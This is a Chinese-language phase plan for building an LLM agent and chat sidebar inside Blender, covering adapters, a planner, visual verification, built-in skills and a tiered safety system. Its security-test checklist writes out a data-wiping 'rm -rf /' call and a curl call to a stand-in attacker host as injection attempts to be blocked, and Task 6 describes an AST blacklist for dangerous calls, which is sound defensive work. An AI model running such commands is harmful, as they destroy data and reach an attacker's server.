# Phase 1 详细实施计划

**版本**: v1.0  
**日期**: 2026-03-09  
**状态**: Phase 0 完成，Phase 1 待启动  
**预期时间**: 4-6 周  

---

## 1. 执行摘要

### 1.1 Phase 1 目标

在 Phase 0 完成的 Engine 层基础上，构建 **Agent Core（AI 大脑）** 和 **Blender UI（艺术家入口）**，让用户在 Blender 内通过自然语言完成建模任务。

### 1.2 核心里程碑

**最终验收标准**：用户在 Blender 侧边栏输入创建一个带材质的小屋，AI 自动完成：
- 创建房屋结构（墙壁、屋顶、门窗）
- 添加材质和纹理
- 设置基础灯光
- 用户可一键撤销整个操作

### 1.3 关键成果

- ✅ Agent Core 可调用任意 LLM（OpenAI/Anthropic/本地模型）
- ✅ Blender 内置聊天面板可用
- ✅ 视觉反馈循环（截图 → LLM → 验证）
- ✅ 分级安全体系运行
- ✅ 技能引擎可执行内置技能包
- ✅ 20+ 内置技能包覆盖常见操作

## 2. 任务拆解

### Task 1: Agent Core 基础架构

**描述**: 创建 `packages/agent-core/` 包，实现核心模块骨架。

**实现步骤**:
1. 创建包结构和 `pyproject.toml`
2. 定义 `AgentRequest/AgentResponse` 协议（复用 `shared/protocol/`）
3. 实现 `AgentCore` 主类（协调各模块）
4. 实现 `SessionManager`（会话隔离和历史管理）
5. 实现 `ToolRouter`（Engine 调用映射）
6. 编写单元测试

**验收标准**:
- [ ] `AgentCore` 可初始化并接受请求
- [ ] `SessionManager` 可创建/销毁会话
- [ ] `ToolRouter` 可将工具名映射到 Engine 调用
- [ ] 所有模块有 >80% 测试覆盖率

**依赖**: 无（可立即开始）

**时间估算**: 3 人天

**风险点**:
- 协议设计不当导致后续重构
- **缓解**: 参考 Phase 0 的 `EngineRequest/EngineResponse` 设计

---

### Task 2: LLM 适配器基础

**描述**: 实现统一的 LLM 适配器接口和能力检测。

**实现步骤**:
1. 定义 `LLMAdapter` 抽象基类
2. 定义 `ModelCapabilities`（tool_calling, vision, context_length）
3. 实现 `FallbackAdapter`（无 tool calling 的降级方案）
4. 实现流式输出接口
5. 编写适配器测试框架

**验收标准**:
- [ ] `LLMAdapter` 接口定义清晰
- [ ] `ModelCapabilities` 可正确检测模型能力
- [ ] `FallbackAdapter` 可用 prompt 模拟 tool calling
- [ ] 流式输出可正常工作

**依赖**: Task 1（Agent Core 基础）

**时间估算**: 2 人天

**风险点**:
- 不同模型的 tool calling 格式差异大
- **缓解**: 先实现 OpenAI 格式（覆盖 80% 模型），再特化

---

### Task 3: OpenAIAdapter 实现

**描述**: 实现 OpenAI 兼容的 LLM 适配器（覆盖 GPT/Ollama/vLLM/LM Studio）。

**实现步骤**:
1. 实现 `OpenAIAdapter` 类
2. 支持 `chat.completions.create()` 调用
3. 支持流式输出
4. 支持 tool_use（function calling）
5. 支持视觉输入（base64 图片）
6. 实现重试和错误处理
7. 编写集成测试（需真实 API key 或本地 Ollama）

**验收标准**:
- [ ] 可调用 GPT-4o 完成对话
- [ ] 可调用本地 Ollama 模型
- [ ] tool_use 可正确解析和执行
- [ ] 视觉输入可正常工作
- [ ] 错误处理健壮

**依赖**: Task 2（LLM 适配器基础）

**时间估算**: 3 人天

**风险点**:
- API 变更导致兼容性问题
- **缓解**: 使用官方 SDK（`openai` Python 包）

---

### Task 4: AnthropicAdapter 实现

**描述**: 实现 Anthropic Claude 的原生 tool_use 适配器。

**实现步骤**:
1. 实现 `AnthropicAdapter` 类
2. 支持 `messages.create()` 调用
3. 支持 Claude 原生 tool_use 格式
4. 支持视觉输入
5. 实现流式输出
6. 编写集成测试（需 Anthropic API key）

**验收标准**:
- [ ] 可调用 Claude Opus/Sonnet
- [ ] tool_use 可正确解析（Claude 格式与 OpenAI 不同）
- [ ] 视觉输入可正常工作
- [ ] 流式输出可正常工作

**依赖**: Task 2（LLM 适配器基础）

**时间估算**: 2 人天

**风险点**:
- Claude tool_use 格式特殊
- **缓解**: 参考官方文档和示例

---

### Task 5: 任务规划器（Planner）

**描述**: 实现将用户指令拆解为工具调用序列的规划器。

**实现步骤**:
1. 实现 `TaskPlanner` 类
2. 实现上下文自动拉取（操作前调用 `get_scene`）
3. 实现多步规划（LLM 生成工具调用序列）
4. 实现执行循环（调用 → 验证 → 继续）
5. 实现错误恢复（失败后重试或调整计划）
6. 编写规划测试

**验收标准**:
- [ ] 可将创建一个立方体拆解为 `blender_create_object` 调用
- [ ] 可将创建红色立方体拆解为 create + modify 序列
- [ ] 执行失败时可自动重试
- [ ] 上下文自动拉取正常工作

**依赖**: Task 3 或 Task 4（至少一个 LLM 适配器）

**时间估算**: 4 人天

**风险点**:
- LLM 幻觉导致错误规划
- **缓解**: 小步执行 + 视觉验证循环

---

### Task 6: 分级安全体系

**描述**: 实现 Level 0-3 的安全等级和 AST 黑名单检查。

**实现步骤**:
1. 定义安全等级枚举（Level 0-3）
2. 为每个 Engine capability 标记安全等级
3. 实现 AST 静态分析（检测 `os.system`, `subprocess` 等）
4. 实现用户确认流程（Level 2 操作）
5. 实现显式授权模式（Level 3 操作）
6. 编写安全测试（尝试注入恶意代码）

**验收标准**:
- [ ] Level 0-1 操作自动放行
- [ ] Level 2 操作触发用户确认
- [ ] Level 3 操作仅在显式模式下可用
- [ ] 禁止项（`os.system` 等）绝对拒绝
- [ ] AST 分析可检测所有已知危险模式

**依赖**: Task 1（Agent Core 基础）

**时间估算**: 3 人天

**风险点**:
- AST 分析被绕过
- **缓解**: 多层防御 + 白名单机制

---

### Task 7: Blender 侧边栏聊天面板

**描述**: 开发 Blender Addon，提供侧边栏聊天 UI。

**实现步骤**:
1. 创建 `packages/frontend-blender/` 包
2. 实现 `bpy.types.Panel`（侧边栏面板）
3. 实现消息列表显示（用户消息 + AI 回复）
4. 实现输入框和发送按钮
5. 实现子进程启动（启动 Agent Core）
6. 实现 stdin/stdout 通信
7. 实现操作预览和确认按钮
8. 实现一键撤销按钮
9. 编写 Addon 安装脚本

**验收标准**:
- [ ] Blender 侧边栏显示聊天面板
- [ ] 可输入消息并发送
- [ ] AI 回复正常显示
- [ ] 操作预览可正常工作
- [ ] 撤销按钮可正常工作
- [ ] Addon 可一键安装

**依赖**: Task 1（Agent Core 基础）

**时间估算**: 5 人天

**风险点**:
- Blender UI 开发复杂
- **缓解**: 参考现有 Addon 示例

---

### Task 8: 视口截图自动回传

**描述**: 实现操作后自动截图并回传给 LLM 的视觉验证循环。

**实现步骤**:
1. 在 Agent Core 中实现 `VisualFeedbackLoop`
2. 操作后自动调用 `blender_capture_viewport`
3. 将截图编码为 base64
4. 发送给 LLM（如果支持视觉）
5. LLM 验证结果并决定下一步
6. 实现降级方案（无视觉模型时用文本摘要）
7. 编写视觉验证测试

**验收标准**:
- [ ] 操作后自动截图
- [ ] 截图可发送给 LLM
- [ ] LLM 可基于截图验证结果
- [ ] 无视觉模型时降级为文本摘要

**依赖**: Task 5（任务规划器）

**时间估算**: 3 人天

**风险点**:
- 截图传输延迟
- **缓解**: 压缩图片 + 异步传输

---

### Task 9: 技能引擎基础

**描述**: 实现技能匹配、执行和存储的基础设施。

**实现步骤**:
1. 定义 Skill Capsule YAML 格式
2. 实现 `SkillStore`（本地技能库存储）
3. 实现 `SkillMatcher`（模糊匹配用户意图）
4. 实现 `SkillExecutor`（执行 Capsule 的工具调用序列）
5. 实现技能验证（执行后检查）
6. 编写技能引擎测试

**验收标准**:
- [ ] 可加载 YAML 格式的技能包
- [ ] 可匹配用户意图到技能
- [ ] 可执行技能的工具调用序列
- [ ] 执行后可验证结果

**依赖**: Task 5（任务规划器）

**时间估算**: 4 人天

**风险点**:
- 技能匹配准确率低
- **缓解**: 使用 LLM 辅助匹配

---

### Task 10: 编写 20+ 内置技能包

**描述**: 手写 20+ 常见操作的技能包，覆盖建模/材质/灯光。

**实现步骤**:
1. 创建 `skills/builtin/` 目录
2. 编写建模技能（10 个）：
   - `create_cube`, `create_sphere`, `create_cylinder`
   - `create_plane`, `create_cone`, `create_torus`
   - `create_monkey`, `create_camera`, `create_light`
   - `create_empty`
3. 编写材质技能（5 个）：
   - `add_basic_material`, `add_metal_material`
   - `add_glass_material`, `add_emission_material`
   - `add_texture`
4. 编写灯光技能（3 个）：
   - `setup_three_point_lighting`
   - `setup_studio_lighting`
   - `setup_outdoor_lighting`
5. 编写组合技能（2 个）：
   - `create_simple_room`
   - `create_simple_house`
6. 为每个技能编写验证规则
7. 测试所有技能

**验收标准**:
- [ ] 20+ 技能包全部可用
- [ ] 每个技能有清晰的描述和参数
- [ ] 每个技能有验证规则
- [ ] 所有技能测试通过

**依赖**: Task 9（技能引擎基础）

**时间估算**: 6 人天

**风险点**:
- 技能质量参差不齐
- **缓解**: 统一模板 + Code Review

---

## 3. 实施顺序

### 3.1 关键路径

```
Task 1 (Agent Core) → Task 2 (LLM 基础) → Task 3/4 (适配器) → Task 5 (规划器) → Task 8 (视觉) → Task 9 (技能引擎) → Task 10 (技能包)
                                                                      ↓
                                                                Task 7 (Blender UI)
                    Task 6 (安全体系) ────────────────────────────────┘
```

### 3.2 并行任务

**Week 1-2**:
- Task 1 (Agent Core) — 优先级最高
- Task 6 (安全体系) — 可并行开发
- Task 7 (Blender UI) — 可并行开发 UI 骨架

**Week 2-3**:
- Task 2 (LLM 基础)
- Task 3 (OpenAIAdapter) 和 Task 4 (AnthropicAdapter) — 可并行

**Week 3-4**:
- Task 5 (规划器)
- Task 7 (Blender UI) — 继续完善

**Week 4-5**:
- Task 8 (视觉验证)
- Task 9 (技能引擎)

**Week 5-6**:
- Task 10 (技能包)
- 集成测试和 Bug 修复

### 3.3 推荐顺序

1. **立即开始**: Task 1, Task 6, Task 7（UI 骨架）
2. **Week 1 结束前**: Task 1 完成
3. **Week 2**: Task 2, Task 3, Task 4
4. **Week 3**: Task 5, Task 7（完善）
5. **Week 4**: Task 8, Task 9
6. **Week 5-6**: Task 10, 集成测试

---

## 4. 验证清单

### 4.1 单元测试

每个模块需要：
- [ ] >80% 代码覆盖率
- [ ] 所有公共 API 有测试
- [ ] 边界条件测试
- [ ] 错误处理测试

### 4.2 集成测试

- [ ] Agent Core + OpenAIAdapter 集成测试
- [ ] Agent Core + AnthropicAdapter 集成测试
- [ ] Agent Core + Engine 集成测试
- [ ] Blender UI + Agent Core 集成测试
- [ ] 技能引擎 + 规划器集成测试

### 4.3 端到端测试

**场景 1: 简单建模**
- [ ] 用户输入创建一个立方体
- [ ] AI 调用 `blender_create_object`
- [ ] Blender 中出现立方体
- [ ] 用户可撤销

**场景 2: 带材质建模**
- [ ] 用户输入创建一个红色的球体
- [ ] AI 调用 create + modify 序列
- [ ] Blender 中出现红色球体
- [ ] 用户可撤销

**场景 3: 复杂任务（里程碑）**
- [ ] 用户输入创建一个带材质的小屋
- [ ] AI 调用技能包或生成多步计划
- [ ] Blender 中出现完整小屋（墙壁+屋顶+门窗+材质）
- [ ] 用户可撤销整个操作

### 4.4 安全测试

- [ ] 尝试注入 `os.system("rm -rf /")`（应被拒绝）
- [ ] 尝试注入 `subprocess.call(["curl", "evil.com"])`（应被拒绝）
- [ ] Level 2 操作触发确认
- [ ] Level 3 操作在非显式模式下被拒绝

### 4.5 性能测试

- [ ] 单次对话延迟 <5s（本地模型）
- [ ] 单次对话延迟 <3s（云端模型）
- [ ] 连续 10 次操作无内存泄漏
- [ ] Blender UI 无卡顿

---

## 5. 风险评估

### 5.1 技术风险

| 风险 | 可能性 | 影响 | 缓解措施 |
|:---|:---:|:---:|:---|
| LLM 幻觉导致错误操作 | 高 | 中 | 小步执行 + 视觉验证 + 操作预览 |
| Blender UI 开发复杂 | 中 | 高 | 参考现有 Addon + 简化 MVP |
| 不同模型 tool calling 格式不兼容 | 中 | 中 | 统一适配器接口 + 降级方案 |
| 安全体系被绕过 | 低 | 高 | 多层防御 + AST 分析 + 白名单 |
| 技能匹配准确率低 | 中 | 中 | LLM 辅助匹配 + 用户反馈 |

### 5.2 时间风险

| 风险 | 可能性 | 影响 | 缓解措施 |
|:---|:---:|:---:|:---|
| Task 5 (规划器) 超时 | 中 | 高 | 简化 MVP，先实现单步规划 |
| Task 7 (Blender UI) 超时 | 中 | 高 | 先实现命令行版本，UI 延后 |
| Task 10 (技能包) 超时 | 低 | 中 | 减少技能数量（10 个即可） |
| 集成测试发现重大问题 | 中 | 高 | 预留 1 周 Buffer 时间 |

### 5.3 依赖风险

| 风险 | 可能性 | 影响 | 缓解措施 |
|:---|:---:|:---:|:---|
| OpenAI/Anthropic API 变更 | 低 | 中 | 使用官方 SDK + 版本锁定 |
| Blender API 变更 | 低 | 高 | 锁定 Blender 4.5 LTS |
| Engine 层发现 Bug | 中 | 中 | 及时修复 + 回归测试 |

---

## 6. 时间估算汇总

| 任务 | 人天 | 依赖 |
|:---|:---:|:---|
| Task 1: Agent Core 基础 | 3 | 无 |
| Task 2: LLM 适配器基础 | 2 | Task 1 |
| Task 3: OpenAIAdapter | 3 | Task 2 |
| Task 4: AnthropicAdapter | 2 | Task 2 |
| Task 5: 任务规划器 | 4 | Task 3/4 |
| Task 6: 分级安全体系 | 3 | Task 1 |
| Task 7: Blender UI | 5 | Task 1 |
| Task 8: 视觉验证循环 | 3 | Task 5 |
| Task 9: 技能引擎基础 | 4 | Task 5 |
| Task 10: 内置技能包 | 6 | Task 9 |
| **总计** | **35 人天** | |

**预期时间**: 4-6 周（1 人全职）或 2-3 周（2 人并行）

**Buffer**: 建议预留 1 周用于集成测试和 Bug 修复

---

## 7. 下一步行动

1. **确认计划**: Review 本计划，确认任务拆解合理
2. **创建 GitHub Issues**: 为每个 Task 创建 Issue
3. **启动 Task 1**: 创建 `packages/agent-core/` 包结构
4. **并行启动 Task 6 和 Task 7**: 安全体系和 Blender UI 骨架

---

**附录：关键参考**

- Phase 0 完成报告: `PHASE0_COMPLETE.md`
- 架构设计文档: `plan.md`
- Engine 协议: `shared/protocol/engine_protocol.py`
- Engine 实现: `packages/engine/blender_engine/engine.py`
